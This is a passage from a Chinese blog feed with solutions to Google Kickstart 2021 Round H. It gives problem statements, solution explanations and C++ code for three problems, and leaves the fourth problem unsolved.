<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>kickstart 2021 round  H</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/54/</url>
    <content><![CDATA[<h1 id="kickstart-2021-round-H"><a href="#kickstart-2021-round-H" class="headerlink" title="kickstart 2021 round  H"></a>kickstart 2021 round  H</h1><p><code>kickstart</code>的题目一向质量高,并且难度非常大，感觉基本上是校招面试题中难度最大的题目了，感觉力扣的难度弱爆了. 前三题感觉基本上只需要基本的数学技巧和数据结构的基本知识就可以做出来，最后一题真心是达到<code>ACM</code>的入门难度，还是挺难的题目。第四题花了好长时间才能弄懂题解.</p>
<h3 id="Transform-the-String"><a href="#Transform-the-String" class="headerlink" title="Transform the String"></a>Transform the String</h3><p>Problem</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You are given a string S which denotes a padlock consisting of lower case English letters. You are also given a string F consisting of set of favorite lower case English letters. You are allowed to perform several operations on the padlock. In each operation, you can change one letter of the string to the one following it or preceding it in the alphabetical order. For example: for the letter c, you are allowed to change it to either b or d in an operation. The letters can be considered in a cyclic order, i.e., the preceding letter for letter a would be letter z. Similarly, the following letter for letter z would be letter a.</span><br><span class="line"></span><br><span class="line">Your aim is to find the minimum number of operations that are required such that each letter in string S after applying the operations, is present in string F.</span><br></pre></td></tr></table></figure>

<p>Input</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The first line of the input gives the number of test cases, T. T test cases follow.</span><br><span class="line"></span><br><span class="line">Each test case consists of two lines.</span><br><span class="line">The first line of each test case contains the string S.</span><br><span class="line">The second line of each test case contains the string F.</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For each test case, output one line containing Case #x: y, where x is the test case number (starting from 1) and y is the minimum number of operations that are required such that each letter in string S after applying the operations, is one of the characters in string F.</span><br></pre></td></tr></table></figure>

<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008da461#problem">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008da461#problem</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 遍历</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>第一题就是灌水题，非常简单.　要求找到将字符串中的字符全部变为给定的字符集中字符，求最小的变换次数，字符 <code>a</code> 转换到字符 <code>b</code> 有两种转换方法, 要么递增,要么递减翻转. $minstep &#x3D; \min(|a-b|,26 - |a-b|)$,我们首先统计字符串 $s$ 中每种字符的个数, 然后对 $s$ 中的每种字符在字符集中找到最小的变换步数的目标字符 $c$ 即可.</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度: $O(CN)$,其中 $M$ 为字符集中字符的个数。</li>
<li>空间复杂度: $O(C)$,其中 $C &#x3D; 26$。</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    string src;</span><br><span class="line">    string target;  </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;src;</span><br><span class="line">    cin&gt;&gt;target;  </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c : src) cnt[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(cnt[i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">int</span> curr = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : target) &#123;</span><br><span class="line">            curr = <span class="built_in">min</span>(curr, <span class="built_in">abs</span>(<span class="string">&#x27;a&#x27;</span> + i - c));</span><br><span class="line">            curr = <span class="built_in">min</span>(curr, <span class="number">26</span> - <span class="built_in">abs</span>(<span class="string">&#x27;a&#x27;</span> + i - c));</span><br><span class="line">        &#125;</span><br><span class="line">        ans += (<span class="type">long</span> <span class="type">long</span>)curr * cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Painter"><a href="#Painter" class="headerlink" title="Painter"></a>Painter</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/12/01/CoIOBGxR7zY4P3U.png"></p>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008d9a88">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008d9a88</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 贪心算法或者<code>dfs</code></p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目非常有趣,感觉跟某个力扣的某个题非常像,题意是说每种颜色可能有红黄蓝三种基本颜色组合, 每次涂画时可以选择一个区间　$[L,R]$ 涂上一种基本色, 给定的区间颜色分布,找到最少的涂画次数.</li>
<li>贪心算法, 我们设 $dp[i]$ 表示涂画前 $i$ 个颜色时所需要的涂画的最小步数, 我们在画 第 $i+1$ 个颜色时我们应该如何选择呢:</li>
</ol>
<ul>
<li>按照贪心算法进行选择颜色, 假设第 $i$ 个颜色的基色包括 $i+1$ 个颜色使用的所有基色, 那么我们可以知道在画第 $i$ 个颜色时的基色时 我们肯定可以将 $i+1$ 个颜色的基色也包含进去,因此 $dp[i+1] &#x3D; dp[i]$, 我们举例如下:<ul>
<li>我们假设第 $i$ 个颜色为 $G$, 第 $i+1$ 个颜色为 $P$, 则此时我们假设 $i$ 中的三种基色最后涂画时的区间分布分别为 $[L_r,i],[L_g,i],[L_b,i]$, 我们可以知道按照贪心原则我们可以将以上 $red$, $blue$ 的区间向由扩展一个位置,则此时三种基色的区间分别为 $[L_r,i+1],[L_g,i],[L_b,i+1]$, 此时即可同时满足第 $i$ 个颜色与 第 $i+1$ 个颜色.</li>
</ul>
</li>
<li>假设第 $i$ 个颜色的基色不能包含第 $i+1$ 个颜色使用的所有基色时,则此时我们只需要找到第 $i+1$ 个颜色使用了与第 $i$ 个颜色有哪些不同的基色.此时递推公式为 $dp[i+1] &#x3D; dp[i] + diff(i,i+1)$<br>实际处理中我们对每种颜色进行二进制编码, 我们用 $mask[i]$ 表示第 $i$ 个颜色的二进制编码, $mask[i+1]$ 表示第 $i+1$ 个颜色的二进制编码,则此时我们可以知道递推公式为 $dp[i+1] &#x3D; dp[i] + count((mask[i]|mask[i]) \oplus maks[i])$</li>
</ul>
<ol start="2">
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度分析: 时间复杂度为 $O(N)$,其中 $N$ 为字符串的长度.</li>
<li>空间复杂度分析: 空间复杂度为 $O(N)$,其中 $N$ 为字符串的长度.</li>
</ul>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Red + Yellow = Orange 110</span></span><br><span class="line"><span class="comment">Red + Blue = Purple   101</span></span><br><span class="line"><span class="comment">Yellow + Blue = Green 011</span></span><br><span class="line"><span class="comment">Red + Yellow + Blue = Gray 111</span></span><br><span class="line"><span class="comment">U = Uncolored 000</span></span><br><span class="line"><span class="comment">R = Red       100</span></span><br><span class="line"><span class="comment">Y = Yellow    010</span></span><br><span class="line"><span class="comment">B = Blue      001</span></span><br><span class="line"><span class="comment">O = Orange    110</span></span><br><span class="line"><span class="comment">P = Purple    101</span></span><br><span class="line"><span class="comment">G = Green     011</span></span><br><span class="line"><span class="comment">A = Gray      111</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*ROAOR 3</span></span><br><span class="line"><span class="comment">  12331 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">        x = x&amp;(x<span class="number">-1</span>);</span><br><span class="line">        res++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; dict = &#123;<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;A&#x27;</span>&#125;;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr = &#123;<span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        cnt[dict[i]] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="built_in">count</span>(cnt[s[<span class="number">0</span>]]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="type">int</span> curr = cnt[s[i]];</span><br><span class="line">        <span class="type">int</span> prev = cnt[s[i - <span class="number">1</span>]];</span><br><span class="line">        dp[i] = dp[i<span class="number">-1</span>] + <span class="built_in">count</span>(curr|prev) - <span class="built_in">count</span>(prev);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    cout&lt;&lt;dp[n<span class="number">-1</span>]&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Silly-Substitutions"><a href="#Silly-Substitutions" class="headerlink" title="Silly Substitutions"></a>Silly Substitutions</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>You are given a string S of length N which consists of digits 0-9. You do the following operations on the string in the order given.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Find all the substrings 01 and replace each of them with 2.</span><br><span class="line">Find all the substrings 12 and replace each of them with 3.</span><br><span class="line">Find all the substrings 23 and replace each of them with 4.</span><br><span class="line">Find all the substrings 34 and replace each of them with 5.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
<p>Find all the substrings 89 and replace each of them with 0.<br>Find all the substrings 90 and replace each of them with 1.<br>You repeat this process in the same given order until none of the above operations change the string. For example, if S is 12 then we do not stop at operation 1 since it does not affect the string but perform operation 2 and change the string to 3. We can see that the string does not change further no matter how many times we repeat the above process.</p>
<p>Your task is to find how the final string will look like for the given S.</p>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008d94f5">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008d94f5</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 双链表</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>题目还是非常不错的，我们首先将字符串用双链表来表示出来．我们首先将双链表中所有可能合并的字符串的头节点全部存储在10个集合中,比如我们知道目前双链表如下:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0-&gt;1-&gt;2-&gt;3&gt;4</span><br></pre></td></tr></table></figure>
此时我们知道可能合并的字符串分别为:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0-&gt;1</span><br><span class="line">1-&gt;2</span><br><span class="line">2-&gt;3</span><br><span class="line">3-&gt;4</span><br></pre></td></tr></table></figure>
我们会存储$0,1,2,3$ 所在的头节点.</li>
<li>我们依次遍历所有可能合并的组合 $01,12,23,34,45,56,…,90$等等.我们每次取出可以合并的数字组合时,每次合并时可能会产生新的组合,我们将新的可以合并的组合再加入到集合中,比如以下举例:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...a-&gt;0-&gt;1-&gt;b...</span><br></pre></td></tr></table></figure>
我们将 $01$ 进行合并后生成 $a2b$, 此时我们首先对双链表进行节点的删除与插入,同时对新生成的数字组合判断是否可以构成待消除的组合,如果含有可以消除的组合,则我们将其插入到集合中.</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度为 $O(CN)$,其中 $N$ 为字符串的长度, 我们每次 $10$ 次循环依次判断从 $01 \cdots 90$的消除组合，每次消除时都能消除一个字符，最多需要 $O(10N)$ 的时间复杂度．</li>
<li>空间复杂度为 $O(N)$,其中 $N$ 为字符串的长度.</li>
</ul>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">	T val;</span><br><span class="line">    ListNode * prev;</span><br><span class="line">    ListNode * next;</span><br><span class="line">    <span class="built_in">ListNode</span>(T val)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;val = val;</span><br><span class="line">        <span class="keyword">this</span>-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> ListNode&lt;T&gt; * <span class="title">insert</span><span class="params">(ListNode&lt;T&gt; * curr, T val)</span> </span>&#123;</span><br><span class="line">    ListNode&lt;T&gt; * node = <span class="keyword">new</span> <span class="built_in">ListNode</span>&lt;T&gt;(val);</span><br><span class="line">    <span class="keyword">if</span>(curr-&gt;next)&#123;</span><br><span class="line">        node-&gt;next = curr-&gt;next;</span><br><span class="line">        curr-&gt;next-&gt;prev = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(curr) &#123;</span><br><span class="line">        curr-&gt;next = node;</span><br><span class="line">        node-&gt;prev = curr;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">   string s;</span><br><span class="line">   string ans;</span><br><span class="line">   <span class="type">int</span> n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line">   cin&gt;&gt;s;</span><br><span class="line">   <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nxt</span><span class="params">(<span class="number">12</span>)</span></span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i) nxt[i] = (i+<span class="number">1</span>)%<span class="number">10</span>;</span><br><span class="line">   nxt[<span class="number">10</span>] = <span class="number">10</span>;</span><br><span class="line">   nxt[<span class="number">11</span>] = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* link list*/</span></span><br><span class="line">   vector&lt;unordered_set&lt;ListNode&lt;<span class="type">int</span>&gt; *&gt;&gt; <span class="built_in">arr</span>(<span class="number">10</span>);</span><br><span class="line">   ListNode&lt;<span class="type">int</span>&gt; * head = <span class="keyword">new</span> <span class="built_in">ListNode</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>);</span><br><span class="line">   <span class="built_in">insert</span>(head,<span class="number">11</span>);</span><br><span class="line">   ListNode&lt;<span class="type">int</span>&gt; * tail = head;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">auto</span> c : s) &#123;</span><br><span class="line">       tail = <span class="built_in">insert</span>(tail, c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(ListNode&lt;<span class="type">int</span>&gt; * node = head; node != <span class="literal">nullptr</span>; node = node-&gt;next) &#123;</span><br><span class="line">       <span class="keyword">if</span>(node-&gt;next &amp;&amp; nxt[node-&gt;val] == node-&gt;next-&gt;val)&#123;</span><br><span class="line">           arr[node-&gt;val].<span class="built_in">insert</span>(node);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* we remove each key and merge*/</span> </span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       <span class="type">bool</span> rflag = <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i) &#123;</span><br><span class="line">           <span class="keyword">if</span>(arr[i].<span class="built_in">empty</span>()) <span class="keyword">continue</span>;</span><br><span class="line">           rflag = <span class="literal">true</span>;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">auto</span> t : arr[i])&#123;</span><br><span class="line">               ListNode&lt;<span class="type">int</span>&gt; * curr = <span class="keyword">new</span> <span class="built_in">ListNode</span>&lt;<span class="type">int</span>&gt;((nxt[t-&gt;val] + <span class="number">1</span>)%<span class="number">10</span>);</span><br><span class="line">               ListNode&lt;<span class="type">int</span>&gt; * prev = t-&gt;prev;</span><br><span class="line">               ListNode&lt;<span class="type">int</span>&gt; * next = t-&gt;next-&gt;next;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/*remove key node*/</span></span><br><span class="line">               <span class="keyword">if</span>(nxt[prev-&gt;val] == t-&gt;val)&#123;</span><br><span class="line">                   arr[prev-&gt;val].<span class="built_in">erase</span>(prev);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(nxt[t-&gt;next-&gt;val] == next-&gt;val)&#123;</span><br><span class="line">                   arr[t-&gt;next-&gt;val].<span class="built_in">erase</span>(t-&gt;next);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/*merge new key*/</span></span><br><span class="line">               prev-&gt;next = curr;</span><br><span class="line">               curr-&gt;prev = prev;</span><br><span class="line">               curr-&gt;next = next;</span><br><span class="line">               next-&gt;prev = curr;</span><br><span class="line">               <span class="keyword">if</span>(nxt[prev-&gt;val] == curr-&gt;val)&#123;</span><br><span class="line">                   arr[prev-&gt;val].<span class="built_in">insert</span>(prev);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(nxt[curr-&gt;val] == next-&gt;val)&#123;</span><br><span class="line">                   arr[curr-&gt;val].<span class="built_in">insert</span>(curr);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">delete</span> t-&gt;next;</span><br><span class="line">               <span class="keyword">delete</span> t;</span><br><span class="line">               </span><br><span class="line">           &#125;</span><br><span class="line">           arr[i].<span class="built_in">clear</span>();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(!rflag) <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span>(ListNode&lt;<span class="type">int</span>&gt; * node = head; node != <span class="literal">nullptr</span>; node = node-&gt;next) &#123;</span><br><span class="line">       <span class="keyword">if</span>(node-&gt;val &gt;= <span class="number">0</span> &amp;&amp; node-&gt;val &lt;= <span class="number">9</span>) &#123;</span><br><span class="line">           ans.<span class="built_in">push_back</span>(node-&gt;val + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">   cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Dependent-Events"><a href="#Dependent-Events" class="headerlink" title="Dependent Events"></a>Dependent Events</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There are N events, numbered 1 through N. The probability of occurrence of each event depends upon the occurrence of exactly one other event called the parent event, except event 1, which is an independent event. In other words, for each event from 2 to N, 3 values are given: Pi denoting the parent event of event i, Ai denoting the probability of occurrence of event i if its parent event occurs, and Bi denoting the probability of occurrence of event i if its parent event does not occur. For event 1, its probability of occurrence K is given. There are Q queries that we want to answer. Each query consists of 2 distinct events, uj and vj, and you need to find the probability that both events uj and vj have occurred.</span><br></pre></td></tr></table></figure>

<h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008d9970">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435914/00000000008d9970</a></p>
<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 数学问题</p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目太难了，不会．</p>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mike-box.github.io/">http://mike-box.github.io/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>贪吃蛇</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/57/</url>
